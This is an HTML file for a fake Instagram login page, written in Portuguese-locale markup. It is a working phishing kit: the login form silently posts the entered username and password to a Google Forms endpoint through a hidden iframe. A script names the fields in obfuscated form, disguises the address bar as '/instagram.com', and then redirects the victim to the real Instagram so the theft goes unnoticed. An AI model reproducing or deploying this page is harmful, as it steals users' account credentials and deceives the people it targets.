<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){task();}"></iframe>
                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeIij30iOvOO8gVOd7y0nA5rZ2XVw-eYaOeWhggGngVnjjdBw/formResponse" method="post" target="hidden_iframe" onsubmit="submitted=true;">
                    <label for="email" class="sr-only">Phone number, username or email</label>
                    <input type="text" id="email" placeholder="Phone number, username or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" type="password" placeholder="Password" />

                    <button type="submit">Log in</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img><i class="fa-brands fa-square-facebook" style="color:#385185;"></i><img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot Password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Contact Uploading & Non-Users</a></li>
            <li><a href="#">Meta Verified</a></li>
        </ul>
        <p class="copyright">Â© 2023 Instagram from Meta</p>
    </footer>
    <script> 
        document.getElementById('email').setAttribute("name","entry"+".1401818141");
        document.getElementById('password').setAttribute("name","entry"+".1182874847");
        onload = function(){
            const newURL = '/instagram.com';

            // Change the URL without reloading the page
            history.replaceState({}, '', newURL);
        }
        function task(){
            window.location.href='https://www.instagram.com/';
          }
    </script>
</body>
</html>
